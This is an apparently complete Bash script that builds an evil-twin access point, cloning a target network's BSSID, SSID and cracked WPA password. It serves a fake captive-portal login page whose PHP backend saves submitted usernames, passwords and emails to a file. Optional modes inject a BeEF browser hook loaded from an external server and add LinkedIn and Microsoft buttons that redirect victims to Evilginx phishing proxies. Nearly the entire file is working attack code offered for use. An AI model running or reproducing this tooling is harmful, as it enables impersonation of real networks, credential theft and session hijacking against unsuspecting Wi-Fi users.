#!/bin/bash

RED='\033[0;31m'
BRED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[0;33m'
BLUE='\033[1;34m'
PURPLE='\033[0;35m'
CYAN='\033[1;36m'
NC='\033[0m'


MON_INTERFACE=""
SELECTED_INTERFACE="wlan0"
INTERFACE_INTERNET_OUTPUT="eth0"

BSSID_VAR="D4:60:E3:C0:D8:36"
CHANNEL_VAR="11"
PRIVACY_VAR="WPA2 WPA"
CIPHER_VAR="CCMP TKIP"
AUTH_VAR="PSK"
BEACONS_VAR=""
ESSID_VAR="PI_WIFI_TEST"
PASSWORD_CRACKED="A123456789a!"

#Variables Hostapd
IP_PORTAL=192.168.1.1
HTTP=80
HTTPS=443
DNS=53

#Variables Evilginx
EVILGINX_LINK1=""
EVILGINX_LINK2=""
EVILGINX_HTML_LINKEDIN=""
EVILGINX_HTML_MICROSOFT=""
EVILGINX_CSS=""
DIRECTORY_EVIL="./templates/evilginx/"
FILE_LINKEDIN="linkedin_login.php"
FILE_MICROSOFT="microsoft_login.php"
LOGO_LINKEDIN="logo_linkedin.svg"
LOGO_MICROSOFT="logo_microsoft.svg"
CHOICE_EVIL=""

#Variables BEEF
VARIATION="$1" #Sacar el $1 al pasar al interceptor.sh
BEEF_HTML=""
IP_HOOK=""

#Variable archivos
DIRECTORY="./templates/"
DIRECTORY_APACHE="./templates/apache2/"
FILE_isc="isc-dhcp-server"
DIR_ETC_DEFAULT="/etc/default/"
FILE_dhcp="dhcpd.conf"
DIR_ETC_DHCP="/etc/dhcp/"
FILE_dns="dnsmasq.conf"
DIR_ETC="/etc/"

FILE_INDEX="index.php"
FILE_REGISTER="register.php"
FILE_CSS="style.css"
DIR_WEB=/var/www/html/

FILE_hostapd="hostapd.conf"

DIR_APACHE_SITE="/etc/apache2/sites-available"
FILE_default="000-default.conf"
FILE_ssl="default-ssl.conf"
FILE_htaccess="htaccess"

check_success() {
    # https://www.squash.io/determining-the-success-of-a-bash-script-in-linux/
    if [ $? -ne 0 ]; then
        echo -e "${RED}[✗] Error to the execute the command: $1${NC}"
        exit 1
    else
        echo -e "${GREEN}[✓] $1 Completed.${NC}"
    fi
}

ask_interface_out(){
    INTERFACES=($(ip -o link show | awk -F': ' '{print $2}'))

    #Verifica si tiene interfaces activas
    if [ ${#INTERFACES[@]} -lt 1 ]; then
    echo "There's no active interfaces."
    exit 1
    fi

    # Mostrar las interfaces disponibles
    echo "Select a network interface to take the traffic outside:"
    for i in "${!INTERFACES[@]}"; do
        echo "$((i+1)). ${INTERFACES[i]}"
    done

    # Leer la selección del usuario
    read -p "Enter the interface wanted to take the traffic outside: " CHOICE

    # Validar la entrada
    if [[ ! "$CHOICE" =~ ^[0-9]+$ ]] || ((CHOICE < 1 || CHOICE > ${#INTERFACES[@]})); then
        echo "Selected interface not valid."
        exit 1
    fi
    INTERFACE_OUTPUT="${INTERFACES[CHOICE-1]}"

    if [[ "$INTERFACE_OUTPUT" == "$SELECTED_INTERFACE" || "$INTERFACE_OUTPUT" == "$MON_INTERFACE" ]]; then
        echo "Can't select the same interface as the wireless attack interface"
        exit 1
    fi

    # Obtener la interfaz seleccionada
    
    echo "INTERFACE output is : $INTERFACE_OUTPUT"
}

rules_iptables_ipforward(){

    sudo sysctl -w net.ipv4.ip_forward=1
    
    iptables -t nat -A POSTROUTING -o $INTERFACE_OUTPUT -j MASQUERADE

    # Permitir acceso al portal
    iptables -A FORWARD -i $SELECTED_INTERFACE -d $IP_PORTAL -j ACCEPT

    # Bloquear tráfico de los clientes excepto al portal cautivo (80, 443)
    sudo iptables -A FORWARD -i $SELECTED_INTERFACE -o $INTERFACE_OUTPUT -j REJECT

    #Peticiones HTTP/S van al portal de apache2
    iptables -t nat -A PREROUTING -i $SELECTED_INTERFACE -p tcp --dport $HTTP -j DNAT --to-destination "$IP_PORTAL:$HTTP"
    iptables -t nat -A PREROUTING -i $SELECTED_INTERFACE -p tcp --dport $HTTPS -j DNAT --to-destination "$IP_PORTAL:$HTTPS"
    #Todas las peticiones se van al dns local
    iptables -t nat -A PREROUTING -i $SELECTED_INTERFACE -p udp --dport $DNS -j DNAT --to-destination "$IP_PORTAL:$DNS"
    iptables -t nat -A PREROUTING -i $SELECTED_INTERFACE -p tcp --dport $DNS -j DNAT --to-destination "$IP_PORTAL:$DNS"

}



create_all_files_portal(){

    cat <<EOF > "${DIRECTORY}${FILE_INDEX}"
<?php
// Configuración
\$portal_url = "https://192.168.1.1/index.php";
\$essid = "${ESSID_VAR}";

// Detectar si el cliente ya está autenticado
if (isset(\$_COOKIE['auth']) && \$_COOKIE['auth'] === 'ok') {
    // Responder a comprobaciones de sistema operativo con "éxito"
    if (strpos(\$_SERVER['REQUEST_URI'], '/generate_204') !== false) {
        http_response_code(204);  // Android
        exit;
    }

    if (strpos(\$_SERVER['REQUEST_URI'], 'hotspot-detect.html') !== false) {
        echo "Success";  // Apple
        exit;
    }

    if (strpos(\$_SERVER['REQUEST_URI'], 'connecttest.txt') !== false) {
        echo "Microsoft Connect Test";  // Windows
        exit;
    }
}

// Detección mejorada
\$userAgent = strtolower(\$_SERVER['HTTP_USER_AGENT'] ?? '');
\$requestUri = strtolower(\$_SERVER['REQUEST_URI'] ?? '');

\$captive_checks = [
    'captivenetworksupport',
    'wispr',
    'android',
    'microsoft ncsi',
    'ms-office',
    'xbox'
];

\$test_paths = [
    '/generate_204',
    '/hotspot-detect.html',
    '/ncsi.txt',
    '/connecttest.txt',
    '/connectivity-check.html'
];

if (in_array(\$requestUri, \$test_paths)) {
    header("Location: \$portal_url");
    exit;
}

foreach (\$captive_checks as \$check) {
    if (strpos(\$userAgent, \$check) !== false) {
        header("Location: \$portal_url");
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Required - <?php echo htmlspecialchars(\$essid); ?></title>
    <link rel="stylesheet" href="style.css">
    $BEEF_HTML
</head>
<body>
    <div class="portal">
        <h1>WiFi Login - <?php echo htmlspecialchars(\$essid); ?></h1>
        <form action="register.php" method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="email" name="email" placeholder="Email" required>
            <button type="submit">Connect</button>
        </form>
        $EVILGINX_HTML_LINKEDIN
        $EVILGINX_HTML_MICROSOFT
    </div>
</body>
</html>
EOF

    cat <<'EOF' > "${DIRECTORY}${FILE_REGISTER}"
<?php

// Ruta al archivo donde guardar credenciales
$file = '/var/www/html/creds.txt';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = htmlspecialchars($_POST['username'] ?? '');
    $password = htmlspecialchars($_POST['password'] ?? '');
    $email = htmlspecialchars($_POST['email'] ?? '');
    $ip = $_SERVER['REMOTE_ADDR'];

    $data = "$username:$password:$email\n";

    // Guardar datos
    file_put_contents($file, $data, FILE_APPEND);

    // Permitir tráfico a la IP registrada
    shell_exec("sudo iptables -D FORWARD -s $ip -j ACCEPT 2>/dev/null");
    shell_exec("sudo iptables -I FORWARD -s $ip -j ACCEPT");
    shell_exec("sudo iptables -t nat -I PREROUTING -p udp --dport 53 -s $ip -j RETURN");
    shell_exec("sudo iptables -t nat -I PREROUTING -p tcp --dport 53 -s $ip -j RETURN");

    // Establecer cookie de autenticación 
    setcookie("auth", "ok", time()+18000 , "/");

    // Redirigir a una ruta que active cierre automático del portal
    header("Location: /generate_204");
    exit();
} else {
    header("HTTP/1.1 400 Bad Request");
    echo "Método no permitido";
    exit();
}
?>
EOF

    cat <<EOF > "${DIRECTORY}${FILE_CSS}"
body {
    font-family: Arial, sans-serif;
    background: #f0f0f0;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
}

.portal {
    background: white;
    padding: 2rem;
    border-radius: 8px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    text-align: center;
    width: 300px;
}

input {
    width: 100%;
    padding: 10px;
    margin: 10px 0;
    border: 1px solid #ddd;
    border-radius: 4px;
}

button {
    background: #007bff;
    color: white;
    border: none;
    padding: 10px 15px;
    border-radius: 4px;
    cursor: pointer;
    width: 100%;
}

button:hover {
    background: #0056b3;
}
$EVILGINX_CSS
EOF

    echo "INTERFACESv4=\"${SELECTED_INTERFACE}\"" > "${DIRECTORY}${FILE_isc}"
    echo 'INTERFACESv6=""' >> "${DIRECTORY}${FILE_isc}"
    
    cat <<EOF > "${DIRECTORY}${FILE_dhcp}"
subnet 192.168.1.0 netmask 255.255.255.0 {
    range 192.168.1.15 192.168.1.200;
    option routers 192.168.1.1;
    option domain-name-servers 1.1.1.1,8.8.8.8;
    option broadcast-address 192.168.1.255;
    default-lease-time 600;
    max-lease-time 7200;
}
EOF

cat <<EOF > "${DIRECTORY}${FILE_dns}"
no-resolv
interface=$SELECTED_INTERFACE
bind-interfaces
log-queries
log-facility=/var/log/dnsmasq.log

address=/connectivitycheck.android.com/$IP_PORTAL
address=/clients3.google.com/$IP_PORTAL
address=/apple.com/$IP_PORTAL
address=/msftconnecttest.com/$IP_PORTAL
address=/nmcheck.gnome.org/$IP_PORTAL
address=/network-test.debian.org/$IP_PORTAL

server=8.8.8.8
EOF

    if echo "$PRIVACY_VAR" | grep -q "WPA2 WPA"; then 
        WPA=3
    elif echo "$PRIVACY_VAR" | grep -q "WPA2"; then
        WPA=2
    elif echo "$PRIVACY_VAR" | grep -q "WPA"; then
        WPA=1
    else
        WPA=0  # AP Abierto o WEP (no recomendado)
    fi

    if echo "$AUTH_VAR" | grep -q "PSK"; then
        WPA_KEY_MGMT="WPA-PSK"
    elif echo "$AUTH_VAR" | grep -q "EAP"; then
        WPA_KEY_MGMT="WPA-EAP"
    else
        WPA_KEY_MGMT=""  # Red abierta
    fi

    if echo "$CIPHER_VAR" | grep -q "CCMP" && echo "$CIPHER_VAR" | grep -q "TKIP"; then
        RSN_PAIRWISE="CCMP TKIP"
    elif echo "$CIPHER_VAR" | grep -q "CCMP"; then
        RSN_PAIRWISE="CCMP"
    elif echo "$CIPHER_VAR" | grep -q "TKIP"; then
        RSN_PAIRWISE="TKIP"
    else
        RSN_PAIRWISE=""  # Red abierta o WEP
    fi

    cat <<EOF > "${DIRECTORY}${FILE_hostapd}"
interface=$SELECTED_INTERFACE
driver=nl80211
ssid=$ESSID_VAR
bssid=$BSSID_VAR
hw_mode=g
channel=$CHANNEL_VAR
macaddr_acl=0
auth_algs=1
EOF

# Si tenemos contraseña y el WPA no es abierta haremos la red igual
    if [ -n "$PASSWORD_CRACKED" ] && [ "$WPA" -gt 0 ]; then
        cat <<EOF >> "${DIRECTORY}${FILE_hostapd}"
wpa=$WPA
wpa_passphrase=$PASSWORD_CRACKED
wpa_key_mgmt=$WPA_KEY_MGMT
rsn_pairwise=$RSN_PAIRWISE
EOF
    else
        # Forzar red abierta manteniendo el mismo SSID y BSSID
        cat <<EOF >> "${DIRECTORY}${FILE_hostapd}"
wpa=0
ignore_broadcast_ssid=0
EOF
    fi
}

configure_apache2(){
    #Creamos al usuario unas claves de autocertificacion para el apache.
    sudo openssl req -x509 -newkey rsa:4096 \
    -keyout /etc/ssl/private/captive-portal.key \
    -out /etc/ssl/certs/captive-portal.crt \
    -days 365 -nodes \
    -subj "/C=ES/ST=Catalunya/L=Barcelona/O=CaptivePortal/OU=IT/CN=captive.portal" > /dev/null


    #Desactivamos las paginas webs para cambiar la configuración
    sudo a2dissite 000-default.conf > /dev/null
    sudo a2dissite default-ssl.conf > /dev/null

    # Por si acaso activamos los modulos de rewrite y ssl de apache (Normalmente viene activo)
    sudo a2enmod rewrite > /dev/null
    sudo a2enmod ssl > /dev/null
}
configure_beef_local(){
    
    if [ -d /etc/beef-xss ]; then
        sudo cp ./templates/beef/config.yaml /etc/beef-xss/config.yaml
        sudo chown beef-xss:beef-xss /etc/beef-xss/config.yaml

    else
        echo "The directory /etc/beef-xss does not exist"
        return 1
    fi

    sudo cp /etc/ssl/private/captive-portal.key /etc/beef-xss/
    sudo cp /etc/ssl/certs/captive-portal.crt /etc/beef-xss/
    sudo chmod 644 /etc/beef-xss/captive-portal.key
    sudo chmod 644 /etc/beef-xss/captive-portal.crt
    sudo chmod o+x /etc/beef-xss

    return 0

}

move_files_created(){

    #Archivos de dhcp sercer
    sudo cp "${DIRECTORY}${FILE_isc}" "${DIR_ETC_DEFAULT}${FILE_isc}"
    check_success "cp "${DIRECTORY}${FILE_isc}" "${DIR_ETC_DEFAULT}${FILE_isc}""

    sudo cp "${DIRECTORY}${FILE_dhcp}" "${DIR_ETC_DHCP}${FILE_dhcp}"
    check_success "cp "${DIRECTORY}${FILE_dhcp}" "${DIR_ETC_DHCP}${FILE_dhcp}""

    #Pagina web 
    sudo cp "${DIRECTORY}${FILE_INDEX}" "${DIR_WEB}${FILE_INDEX}"
    check_success "cp "${DIRECTORY}${FILE_INDEX}" "${DIR_WEB}${FILE_INDEX}""

    sudo cp "${DIRECTORY}${FILE_REGISTER}" "${DIR_WEB}${FILE_REGISTER}"
    check_success "cp "${DIRECTORY}${FILE_REGISTER}" "${DIR_WEB}${FILE_REGISTER}""

    sudo cp "${DIRECTORY}${FILE_CSS}" "${DIR_WEB}${FILE_CSS}"
    check_success "cp "${DIRECTORY}${FILE_CSS}" "${DIR_WEB}${FILE_CSS}""

    #Archivos dns server
    sudo cp "${DIRECTORY}${FILE_dns}" "${DIR_ETC}${FILE_dns}"
    check_success "cp "${DIRECTORY}${FILE_dns}" "${DIR_ETC}${FILE_dns}""

    #Apache Config
    sudo cp "${DIRECTORY_APACHE}${FILE_default}" "${DIR_APACHE_SITE}${FILE_default}"
    check_success "cp "${DIRECTORY_APACHE}${FILE_default}" "${DIR_APACHE_SITE}${FILE_default}""

    sudo cp "${DIRECTORY_APACHE}${FILE_ssl}" "${DIR_APACHE_SITE}${FILE_ssl}"
    check_success "cp "${DIRECTORY_APACHE}${FILE_ssl}" "${DIR_APACHE_SITE}${FILE_ssl}""

    #Archivo .htaccess de la plantilla para el captive portal.
    sudo cp "${DIRECTORY_APACHE}${FILE_htaccess}" "${DIR_WEB}.${FILE_htaccess}"
    check_success "cp "${DIRECTORY_APACHE}${FILE_htaccess}" "${DIR_WEB}.${FILE_htaccess}""

    if [ "$VARIATION" -eq "2" ]; then
        #Linkedin Only
        if [ "$CHOICE_EVIL" -eq "1" ];then
            #Archivos Linkedin hacia /etc/www/html
            sudo cp "${DIRECTORY_EVIL}${LOGO_LINKEDIN}" "${DIR_WEB}${LOGO_LINKEDIN}"
            check_success "cp "${DIRECTORY_EVIL}${LOGO_LINKEDIN}" "${DIR_WEB}${LOGO_LINKEDIN}""
            sudo cp "${DIRECTORY}${FILE_LINKEDIN}" "${DIR_WEB}${FILE_LINKEDIN}"
            check_success "cp "${DIRECTORY}${FILE_LINKEDIN}" "${DIR_WEB}${FILE_LINKEDIN}""
        #Microsoft Only
        elif [ "$CHOICE_EVIL" -eq "2" ];then
            #Archivos Microsoft hacia /etc/www/html
            sudo cp "${DIRECTORY_EVIL}${LOGO_MICROSOFT}" "${DIR_WEB}${LOGO_MICROSOFT}"
            check_success "cp "${DIRECTORY_EVIL}${LOGO_MICROSOFT}" "${DIR_WEB}${LOGO_MICROSOFT}""
            sudo cp "${DIRECTORY}${FILE_MICROSOFT}" "${DIR_WEB}${FILE_MICROSOFT}"
            check_success "cp "${DIRECTORY}${FILE_MICROSOFT}" "${DIR_WEB}${FILE_MICROSOFT}""
        else
            #Archivos Linkedin hacia /etc/www/html
            sudo cp "${DIRECTORY_EVIL}${LOGO_LINKEDIN}" "${DIR_WEB}${LOGO_LINKEDIN}"
            check_success "cp "${DIRECTORY_EVIL}${LOGO_LINKEDIN}" "${DIR_WEB}${LOGO_LINKEDIN}""
            sudo cp "${DIRECTORY}${FILE_LINKEDIN}" "${DIR_WEB}${FILE_LINKEDIN}"
            check_success "cp "${DIRECTORY}${FILE_LINKEDIN}" "${DIR_WEB}${FILE_LINKEDIN}""

            #Archivos Microsoft hacia /etc/www/html
            sudo cp "${DIRECTORY_EVIL}${LOGO_MICROSOFT}" "${DIR_WEB}${LOGO_MICROSOFT}"
            check_success "cp "${DIRECTORY_EVIL}${LOGO_MICROSOFT}" "${DIR_WEB}${LOGO_MICROSOFT}""
            sudo cp "${DIRECTORY}${FILE_MICROSOFT}" "${DIR_WEB}${FILE_MICROSOFT}"
            check_success "cp "${DIRECTORY}${FILE_MICROSOFT}" "${DIR_WEB}${FILE_MICROSOFT}""
        fi

    fi
    #Permisos pagina web
    sleep 1

    sudo touch /var/www/html/creds.txt
    check_success "touch /var/www/html/creds.txt"

    sudo chmod -R 777 /var/www/html
    check_success "chmod 664 /var/www/html/*"

    sudo chown www-data:www-data /var/www/html/*
    check_success "chown www-data:www-data /var/www/html/*"

}

activate_dhcp(){

    if sudo systemctl restart isc-dhcp-server ; then
        echo "Succesful DHCP Server"
        return 0
    else
        echo "Error on DHCP Server"
        return 1
    fi
    # sudo journalctl -fu isc-dhcp-server ( Ver en tiempo real el DHCP)
}

activate_dns(){

    if sudo systemctl restart dnsmasq ; then
        echo "Succesful DNS Server"
        return 0
    else
        echo "Error on DNS Server"
        return 1
    fi

}

activate_apache2(){

    if ! sudo a2ensite 000-default.conf > /dev/null ;then
        echo "Can't enable site 000-default"
        return 1
    fi
    
    if ! sudo a2ensite default-ssl.conf > /dev/null;then
        echo "Can't enable site default-ssl"
        return 1
    fi 
    
    if ! sudo systemctl restart apache2 > /dev/null; then 
        echo "Can't Start Apache Service"
        return 1
    fi

    return 0

}

beef_hosted() {
    read -p "Enter the public address ( Or Domain) of the Beef server: (MUST BE HTTPS) " IP_HOOK
    if wget --spider --no-check-certificate https://$IP_HOOK:3000/hook.js > /dev/null ; then
        echo "Found hook on https://$IP_HOOK:3000/hook.js"
    else
        echo "Hook not found at https://$IP_HOOK:3000/hook.js"
        return 1
    fi


    if [[ -n "$DISPLAY" || -n "$WAYLAND_DISPLAY" ]]; then
        firefox --browser   --new-window https://$IP_HOOK:3000/ui/panel
    else
        echo "You are not on graphic terminal we can't open beef panel"
    fi
    return 0
}

beef_local() {
    IP_HOOK="192.168.1.1"

    if ! configure_beef_local; then
        echo "Error configuring beef"
        return 1
    fi

    if ! sudo systemctl restart beef-xss; then 
        echo "Error initiate beef"
        return 1
    fi

    sleep 3
    if wget --spider --no-check-certificate https://$IP_HOOK:3000/hook.js ; then  
        echo "Found hook on $IP_HOOK" 
    else
        echo "Hook not found at https://$IP_HOOK:3000/hook.js"
        return 1
    fi

    

    if [[ -n "$DISPLAY" || -n "$WAYLAND_DISPLAY" ]]; then
        firefox --browser --new-window https://$IP_HOOK_Local:3000/ui/panel
    else
        echo "You are not on graphic terminal we can't open beef panel"
    fi

    return 0
}

beef_menu() {

    MENU_DONE=false
    while [ "$MENU_DONE" != true ]; do
        echo "Beef Menu:"
        echo "1. Use an external server"
        echo "2. Launch Beef locally"
        read -p "Choose an option: " CHOICE

        case "$CHOICE" in
            1)
                MENU_DONE=true
                if ! beef_hosted; then 
                    return 1
                fi
                ;;
            2)
                MENU_DONE=true
                if ! beef_local; then 
                    return 1
                fi
                ;;
            *)
                echo "Wrong number. Please choose 1 or 2."
                ;;
        esac
    done
    return 0
}

make_linkedin(){

    read -p "Enter the full URL of the PHISHLET of linkedin: " URL_PHISHLET_LINKEDIN

    #HTML Botón Linkedin con referencia al php
    EVILGINX_HTML_LINKEDIN=$(cat <<EOF
<a class="linkedin-btn" href="/$FILE_LINKEDIN">
    <img class="linkedin-icon" src="/$LOGO_LINKEDIN" alt="Google logo">
    Iniciar sesión con Linkedin
</a>
EOF
)
    #PHP que en principio si le dan al botton le dejaria tener internet para conectarse al phishlet
    cat <<EOF > "${DIRECTORY}${FILE_LINKEDIN}"
<?php
\$ip = \$_SERVER['REMOTE_ADDR'];

// Allow internet traffic
shell_exec("sudo iptables -D FORWARD -s \$ip -j ACCEPT 2>/dev/null");
shell_exec("sudo iptables -I FORWARD -s \$ip -j ACCEPT");


// Make sure it have dns
shell_exec("sudo iptables -t nat -I PREROUTING -p udp --dport 53 -s \$ip -j RETURN");
shell_exec("sudo iptables -t nat -I PREROUTING -p tcp --dport 53 -s \$ip -j RETURN");

// Redirect to phishlet
header("Location: $URL_PHISHLET_LINKEDIN");
exit();
?>
EOF



    EVILGINX_CSS=$(cat <<EOF
.linkedin-btn {
    display: flex;
    align-items: center;
    background-color: #0077b5;
    color: #fff;
    border: none;
    border-radius: 4px;
    padding: 10px 16px;
    font-size: 14px;
    font-weight: 500;
    font-family: 'Segoe UI', sans-serif;
    text-decoration: none;
    width: fit-content;
    transition: background-color 0.2s ease;
}

.linkedin-btn:hover {
    background-color: #005f91;
}

.linkedin-icon {
    height: 20px;
    margin-right: 10px;
}
EOF
)
    return 0
}

make_microsoft(){

    read -p "Enter the full URL of the PHISHLET Microsoft: " URL_PHISHLET_MICROSOFT

    EVILGINX_HTML_MICROSOFT=$(cat <<EOF
<a class="microsoft-btn" href="$FILE_MICROSOFT">
    <img class="microsoft-icon" src="$LOGO_MICROSOFT" alt="Microsoft logo">
    Iniciar sesión con Microsoft
</a>
EOF
)


    cat <<EOF > "${DIRECTORY}${FILE_MICROSOFT}"
<?php
\$ip = \$_SERVER['REMOTE_ADDR'];

// Allow internet traffic
shell_exec("sudo iptables -D FORWARD -s \$ip -j ACCEPT 2>/dev/null");
shell_exec("sudo iptables -I FORWARD -s \$ip -j ACCEPT");

// Make sure it have dns
shell_exec("sudo iptables -t nat -I PREROUTING -p udp --dport 53 -s \$ip -j RETURN");
shell_exec("sudo iptables -t nat -I PREROUTING -p tcp --dport 53 -s \$ip -j RETURN");

// Redirect to phishlet
header("Location: $URL_PHISHLET_MICROSOFT");
exit();
?>
EOF


EVILGINX_CSS+=$(cat <<EOF
.microsoft-btn {
    display: flex;
    align-items: center;
    background-color: #f3f3f3;
    color: #000;
    border: 1px solid #d6d6d6;
    border-radius: 4px;
    padding: 10px 16px;
    font-size: 14px;
    font-weight: 500;
    font-family: 'Segoe UI', sans-serif;
    text-decoration: none;
    width: fit-content;
    transition: background-color 0.2s ease;
}

.microsoft-btn:hover {
    background-color: #e6e6e6;
}

.microsoft-icon {
    height: 20px;
    margin-right: 10px;
}
EOF
)
    return 0
}

evilginx_menu(){

    MENU_DONE=false
    while [ "$MENU_DONE" != true ]; do
        echo "Select what phishlets you want to insert (Linkedin / Microsoft):"
        echo "1. Linkedin"
        echo "2. Microsoft"
        echo "3. Linkedin + Microsoft"
        read -p "Choose an option: " CHOICE_EVIL

        case "$CHOICE_EVIL" in
            1)
                MENU_DONE=true
                if ! make_linkedin; then 
                    return 1
                fi
                ;;
            2)
                MENU_DONE=true
                if ! make_microsoft; then 
                    return 1
                fi
                ;;
            3)
                MENU_DONE=true
                if ! make_linkedin; then 
                    return 1
                fi
                if ! make_microsoft; then 
                    return 1
                fi
                ;;
            *)
                echo "Wrong number. Please choose 1, 2 or 3."
                ;;
        esac
    done
    return 0

}

turn_off_services(){
    sudo systemctl stop isc-dhcp-server
    sudo systemctl stop dnsmasq
    sudo systemctl stop beef-xss
    sudo systemctl stop apache2    
}

cleanup() {
    echo "[+] Restaurando configuración de red..."

    # Eliminar la regla NAT de POSTROUTING
    sudo iptables -t nat -D POSTROUTING -o $INTERFACE_OUTPUT -j MASQUERADE

    # Eliminar la regla hacia el portal
    iptables -D FORWARD -i $SELECTED_INTERFACE -d $IP_PORTAL -j ACCEPT

    # Eliminar la regla de REJECT para bloquear tráfico de clientes (excepto portal cautivo)
    sudo iptables -D FORWARD -i $SELECTED_INTERFACE -o $INTERFACE_OUTPUT -j REJECT

    # Eliminar la regla de redirección del tráfico HTTP al portal cautivo
    sudo iptables -t nat -D PREROUTING -i $SELECTED_INTERFACE -p tcp --dport $HTTP -j DNAT --to-destination "$IP_PORTAL:$HTTP"
    sudo iptables -t nat -D PREROUTING -i $SELECTED_INTERFACE -p tcp --dport $HTTPS -j DNAT --to-destination "$IP_PORTAL:$HTTPS"

    # Eliminar la regla de redirección DNS UDP (puerto 53) a 192.168.1.1
    iptables -t nat -D PREROUTING -i $SELECTED_INTERFACE -p udp --dport $DNS -j DNAT --to-destination "$IP_PORTAL:$DNS"
    iptables -t nat -D PREROUTING -i $SELECTED_INTERFACE -p tcp --dport $DNS -j DNAT --to-destination "$IP_PORTAL:$DNS"

    sudo sysctl -w net.ipv4.ip_forward=0
    echo "[+] Reglas de iptables eliminadas. Saliendo..."

    sudo ip addr del 192.168.1.1/24 dev $SELECTED_INTERFACE

    sudo ip link set $SELECTED_INTERFACE down
    sudo iw dev $SELECTED_INTERFACE set type managed
    sudo ip link set $SELECTED_INTERFACE up
    sudo ip addr flush dev $SELECTED_INTERFACE
    sudo ip link set $SELECTED_INTERFACE down

    turn_off_services

    sudo iptables -F -t nat

    sudo rm "${DIRECTORY}"*
    
}

set_interface_AP_MODE(){
    
    #Verificar si funciona y que si entramos con monitor lo pone en manager
    if [[ ! -z "$MON_INTERFACE" ]];then
        manager_mode
    fi
   
    #Posem la interficie wireless en mode 
    sudo ip link set $SELECTED_INTERFACE down
    sudo iw dev $SELECTED_INTERFACE set type ap
    sudo ip link set $SELECTED_INTERFACE up

    #En caso que el usuario tenga ya una ip en la interfaz wifi
    sudo ip addr flush dev $SELECTED_INTERFACE

    #Insertamos una ip a la interficie
    sudo ip addr add 192.168.1.1/24 dev $SELECTED_INTERFACE
    check_success "ip addr add 192.168.1.1/24 dev $SELECTED_INTERFACE"

}
false_ap(){
    
    # sudo systemctl stop NetworkManager && sudo systemctl stop wpa_supplicant && sudo airmon-ng check kill
    sudo systemctl stop NetworkManager 
    sudo systemctl stop wpa_supplicant
    #VARIATION="$1"

    # while DOING = true ;do Deauther 0 ;done # Buscar una manera para poder crear hacer el deauther hasta que quiera que pare.
    turn_off_services
    configure_apache2
    
    if [[ "$VARIATION" -eq "2" ]]; then
        echo "Evilginx Mode"

        if ! evilginx_menu; then 
            echo "Error"
            exit 1
        fi

    fi

    set_interface_AP_MODE

    if [[ "$VARIATION" -eq "1" ]]; then
        echo "Beef Mode"
        if ! beef_menu; then 
            echo "No se puede ejecutar el beef"
            exit 1
        else
            BEEF_HTML="<script src="https://$IP_HOOK:3000/hook.js"></script>"
        fi
    fi
    echo "Normal mode"
    VARIATION="0"
    
    

    create_all_files_portal
    move_files_created
    

    if ! activate_dhcp; then 
        exit 1
    fi

    ask_interface_out

    if ! activate_dns; then 
        exit 1
    fi

    if ! activate_apache2; then 
        exit 1
    fi

    rules_iptables_ipforward
    sudo hostapd "${DIRECTORY}${FILE_hostapd}" # -B for broadcast

    # trap cleanup EXIT #Poner
}




false_ap
trap cleanup EXIT